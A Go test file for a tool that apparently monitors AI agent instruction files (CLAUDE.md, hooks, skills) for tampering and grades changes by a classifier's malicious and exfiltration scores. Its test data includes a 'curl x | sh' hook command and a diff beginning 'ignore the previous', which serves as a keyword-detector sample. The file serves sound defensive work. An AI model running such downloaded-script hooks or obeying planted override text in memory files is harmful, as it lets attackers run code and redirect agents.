package cli

import (
	"testing"

	"github.com/ian-hickey/kova/internal/lockfile"
	"github.com/ian-hickey/kova/internal/triage"
)

func TestDecideTriage(t *testing.T) {
	pinned := &lockfile.Entry{Type: lockfile.TypeMemory, Harness: "claude-code", Name: "~/p/CLAUDE.md", Path: "/p/CLAUDE.md", Scope: "project", Hash: "sha256:a"}
	// A keyword hit on the user's own CLAUDE.md edit: today a high suspicious_content.
	live := &lockfile.Entry{Type: lockfile.TypeMemory, Harness: "claude-code", Name: "~/p/CLAUDE.md", Path: "/p/CLAUDE.md", Scope: "project", Hash: "sha256:b", Flags: []string{"suspicious_content"}}
	c, _ := lockfile.BaseChange("k", pinned, &lockfile.Entry{Type: live.Type, Harness: live.Harness, Name: live.Name, Path: live.Path, Scope: live.Scope, Hash: live.Hash})
	if c.Kind != lockfile.ChangeMemory {
		t.Fatalf("base change of an instruction edit should be memory_modified, got %s", c.Kind)
	}
	sus := lockfile.Change{Key: "k", Kind: lockfile.ChangeSuspicious, Severity: lockfile.SevHigh, Type: lockfile.TypeMemory, Message: "suspicious", Details: map[string]any{"diff": "+ignore the previous eslint config"}}

	// Confident benign clears the keyword escalation back to the base change and keeps the diff.
	out, down := decideTriage(sus, triage.Verdict{Malicious: 0.03}, pinned, live)
	if !down || out.Kind != lockfile.ChangeMemory || out.Severity.Rank() >= lockfile.SevHigh.Rank() || out.Details["diff"] == nil || out.Details["triage"] == nil {
		t.Fatalf("expected downgrade to base change with diff+triage, got %+v (down=%v)", out, down)
	}
	// Hidden Unicode is never cleared by the classifier.
	uni := &lockfile.Entry{Type: live.Type, Name: live.Name, Path: live.Path, Hash: live.Hash, Flags: []string{"suspicious_content", "unicode_tags"}}
	if out, down := decideTriage(sus, triage.Verdict{Malicious: 0.01}, pinned, uni); down || out.Kind != lockfile.ChangeSuspicious {
		t.Fatalf("unicode-flagged change must not be downgraded: %+v", out)
	}
	// Confident malicious on a plain low-severity edit raises it to high and labels it suspicious.
	plain := lockfile.Change{Key: "k", Kind: lockfile.ChangeMemory, Severity: lockfile.SevLow, Type: lockfile.TypeMemory, Message: "memory/instruction file changed"}
	out, down = decideTriage(plain, triage.Verdict{Malicious: 0.93, Exfiltration: 0.9}, pinned, live)
	if down || out.Kind != lockfile.ChangeSuspicious || out.Severity != lockfile.SevHigh || out.Details["triage"] == nil {
		t.Fatalf("expected escalation to high suspicious_content, got %+v", out)
	}
	// Critical stays critical; uncertain verdicts only attach scores.
	crit := lockfile.Change{Key: "k", Kind: lockfile.ChangeUnicodeTags, Severity: lockfile.SevCritical}
	if out, _ := decideTriage(crit, triage.Verdict{Malicious: 0.99}, pinned, live); out.Severity != lockfile.SevCritical || out.Kind != lockfile.ChangeUnicodeTags {
		t.Fatalf("critical must stay: %+v", out)
	}
	if out, down := decideTriage(plain, triage.Verdict{Malicious: 0.5}, pinned, live); down || out.Severity != lockfile.SevLow || out.Details["triage"] == nil {
		t.Fatalf("uncertain verdict should only annotate: %+v", out)
	}
}

func TestTriageItemsPreferDiffs(t *testing.T) {
	pinned := map[string]*lockfile.Entry{"k": {Type: lockfile.TypeMemory, Path: "/p/CLAUDE.md", Hash: "sha256:a"}}
	live := map[string]*lockfile.Entry{
		"k": {Type: lockfile.TypeMemory, Path: "/p/CLAUDE.md", Hash: "sha256:b", Content: []byte("whole file")},
		"h": {Type: lockfile.TypeHooks, Path: "/p/.claude/settings.json", Hooks: []byte(`{"Stop":[]}`)},
		"s": {Type: lockfile.TypeSkill, Path: "/p/skill"},
	}
	changes := []lockfile.Change{
		{Key: "k", Kind: lockfile.ChangeMemory, Details: map[string]any{"diff": "+new line"}},
		{Key: "h", Kind: lockfile.ChangeHooks, Details: map[string]any{"added_commands": []string{"curl x | sh"}}},
		{Key: "s", Kind: lockfile.ChangeModified},
	}
	items := triageItems(changes, pinned, live)
	if len(items) != 2 || items[0].Kind != triage.KindChange || items[0].Diff != "+new line" || items[1].Kind != triage.KindHook || items[1].Content != "curl x | sh" {
		t.Fatalf("items wrong: %+v", items)
	}
}

func TestUncertainVerdictDemotesKeywordEscalation(t *testing.T) {
	live := &lockfile.Entry{Type: lockfile.TypeMemory, Path: "/p/CLAUDE.md", Hash: "sha256:b", Flags: []string{"suspicious_content"}}
	sus := lockfile.Change{Key: "k", Kind: lockfile.ChangeSuspicious, Severity: lockfile.SevHigh, Type: lockfile.TypeMemory, Message: "suspicious"}
	out, down := decideTriage(sus, triage.Verdict{Malicious: 0.5}, nil, live)
	if down || out.Severity != lockfile.SevMedium || out.Kind != lockfile.ChangeSuspicious {
		t.Fatalf("uncertain verdict should demote a keyword high to medium: %+v", out)
	}
	// Without any verdict, an observed edit with a keyword hit is medium too.
	obs := []lockfile.Change{{Kind: lockfile.ChangeSuspicious, Severity: lockfile.SevHigh, Details: map[string]any{"observed": true}}}
	observedWithoutTriage(obs)
	if obs[0].Severity != lockfile.SevMedium {
		t.Fatalf("observed keyword hit without triage should be medium: %+v", obs[0])
	}
	// An unobserved keyword hit keeps its high.
	un := []lockfile.Change{{Kind: lockfile.ChangeSuspicious, Severity: lockfile.SevHigh, Details: map[string]any{}}}
	observedWithoutTriage(un)
	if un[0].Severity != lockfile.SevHigh {
		t.Fatalf("unobserved keyword hit must stay high: %+v", un[0])
	}
}
